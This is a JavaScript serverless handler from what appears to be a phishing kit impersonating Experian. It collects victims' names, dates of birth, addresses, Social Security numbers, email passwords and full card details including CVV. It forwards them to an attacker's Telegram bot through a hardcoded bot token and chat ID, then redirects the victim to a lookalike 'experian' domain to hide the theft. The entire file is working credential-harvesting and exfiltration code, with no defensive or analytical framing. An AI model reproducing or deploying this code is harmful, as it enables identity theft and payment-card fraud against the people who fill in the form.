// api/submit.js
import fetch from 'node-fetch';

export default async function handler(req, res) {
  if (req.method === 'POST') {
    try {
      const {
        first_name,
        last_name,
        dob,
        phone_country,
        phone,
        street_address,
        apt_unit,
        zip_code,
        city,
        state,
        ssn,
        email,
        password,
        reason,
        card_number,
        card_expiry_month,
        card_expiry_year,
        card_cvv,
        card_holder_name
      } = req.body;

      // Use hardcoded tokens for now (replace with env vars in production)
      const telegramBotToken = '7362880252:AAFoMzgfag6Y8pUXNgiAMcdGZEpKwQsmCxE';
      const chatId = '7587120060';

      const message = `
⚠️ *New Experian Form Submission* ⚠️

*Personal Info:*
Name: ${first_name} ${last_name}
DOB: ${dob}
Phone: ${phone_country} ${phone}
Address: ${street_address}, ${apt_unit || 'N/A'}, ${city}, ${state} ${zip_code}
SSN: ${ssn}
Email: ${email}
Reason: ${reason}

*Card Info:*
Card #: ${card_number}
Expiry: ${card_expiry_month}/${card_expiry_year}
CVV: ${card_cvv}
Name on Card: ${card_holder_name}
      `.trim();

      // Send to Telegram
      await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'Markdown'
        })
      });

      // ✅ REDIRECT TO YOUR SPECIFIED URL
      const redirectUrl = 'https://finalsubmission-experian-com-static.vercel.app/';
      res.writeHead(302, {
        Location: redirectUrl,
        'Cache-Control': 'no-cache, no-store, must-revalidate'
      });
      res.end();

    } catch (error) {
      console.error('Error:', error);
      // Fallback redirect on error
      res.writeHead(302, { Location: 'https://finalsubmission-experian-com-static.vercel.app/' });
      res.end();
    }
  } else {
    res.status(405).send('Method Not Allowed');
  }
}
